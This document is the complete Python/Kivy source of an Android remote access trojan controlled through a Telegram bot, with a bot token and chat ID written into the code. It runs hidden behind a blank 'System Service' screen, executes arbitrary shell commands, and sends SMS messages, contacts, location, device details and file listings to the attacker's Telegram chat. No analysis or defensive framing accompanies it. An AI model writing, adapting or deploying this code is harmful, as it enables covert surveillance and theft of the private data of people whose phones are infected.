import requests
import json
import time
import subprocess
import os
from threading import Thread
from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from android.permissions import request_permissions, Permission

# Конфигурация - ЗАМЕНИТЬ НА РЕАЛЬНЫЕ ДАННЫЕ
BOT_TOKEN = '8398762315:AAFLzyzea9nmGPAy4oVIw9-Qj6Uxm67JI8Q'
CHAT_ID = '5172363239'

class TelegramRAT:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        
    def send_telegram_message(self, text):
        try:
            url = self.base_url + "sendMessage"
            data = {"chat_id": CHAT_ID, "text": text}
            requests.post(url, data=data, timeout=10)
        except: pass
    
    def get_updates(self):
        try:
            url = self.base_url + "getUpdates"
            response = requests.get(url, timeout=10).json()
            return response.get('result', [])
        except: return []
    
    def execute_commands(self):
        last_update_id = 0
        while True:
            try:
                updates = self.get_updates()
                for update in updates:
                    if update['update_id'] > last_update_id:
                        last_update_id = update['update_id']
                        if 'message' in update:
                            command = update['message'].get('text', '')
                            chat_id = update['message']['chat']['id']
                            self.process_command(command, chat_id)
                time.sleep(5)
            except: time.sleep(10)
    
    def process_command(self, command, chat_id):
        global CHAT_ID
        CHAT_ID = chat_id
        
        if command == '/start':
            self.send_telegram_message("RAT Activated ✅\nDevice: " + self.get_device_info())
        elif command == '/info':
            info = self.get_device_info()
            self.send_telegram_message(f"📱 Device Info:\n{info}")
        elif command == '/location':
            location = self.get_gps_location()
            self.send_telegram_message(f"📍 Location:\n{location}")
        elif command.startswith('/cmd '):
            cmd = command[5:]
            result = self.execute_system_command(cmd)
            self.send_telegram_message(f"⚡ Command:\n{cmd}\n📋 Result:\n{result}")
        elif command == '/sms_dump':
            sms_data = self.dump_sms()
            self.send_telegram_message(f"📨 SMS:\n{sms_data}")
        elif command == '/contacts':
            contacts = self.get_contacts()
            self.send_telegram_message(f"👥 Contacts:\n{contacts}")
        elif command == '/files':
            files = self.list_files()
            self.send_telegram_message(f"📁 Files:\n{files}")
        elif command == '/screenshot':
            self.take_screenshot()
    
    def get_device_info(self):
        try:
            info = {
                'model': subprocess.getoutput('getprop ro.product.model'),
                'android': subprocess.getoutput('getprop ro.build.version.release'),
                'sdk': subprocess.getoutput('getprop ro.build.version.sdk'),
                'battery': subprocess.getoutput('dumpsys battery | grep level'),
                'storage': subprocess.getoutput('df /storage | tail -1')
            }
            return json.dumps(info, indent=2)
        except: return "Info unavailable"
    
    def get_gps_location(self):
        try:
            # Эмуляция GPS для Android 7
            location_cmd = 'dumpsys location | grep -A 10 "last known"'
            location = subprocess.getoutput(location_cmd)
            return location if location else "GPS data not available"
        except: return "Location error"
    
    def execute_system_command(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            return result.decode('utf-8')[:2000]
        except Exception as e:
            return str(e)
    
    def dump_sms(self):
        try:
            # Для Android < 8
            sms_cmd = 'content query --uri content://sms/inbox --projection body,address,date'
            return subprocess.getoutput(sms_cmd)[:1500]
        except: return "SMS access failed"
    
    def get_contacts(self):
        try:
            contacts_cmd = 'content query --uri content://contacts/phones --projection display_name,number'
            return subprocess.getoutput(contacts_cmd)[:1500]
        except: return "Contacts access failed"
    
    def list_files(self):
        try:
            files = subprocess.getoutput('ls -la /sdcard/')[:1500]
            return files
        except: return "File list failed"
    
    def take_screenshot(self):
        try:
            subprocess.run('screencap -p /sdcard/screenshot.png', shell=True)
            self.send_telegram_message("Screenshot saved to /sdcard/screenshot.png")
        except: pass

class RATApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 0)
        # Запуск RAT в фоне
        rat = TelegramRAT()
        Thread(target=rat.execute_commands, daemon=True).start()
        return Label(text='System Service', font_size='1sp')

if __name__ == '__main__':
    request_permissions([
        Permission.READ_EXTERNAL_STORAGE,
        Permission.CAMERA,
        Permission.RECORD_AUDIO,
        Permission.ACCESS_FINE_LOCATION,
        Permission.READ_CONTACTS,
        Permission.READ_SMS,
        Permission.INTERNET
    ])
    RATApp().run()
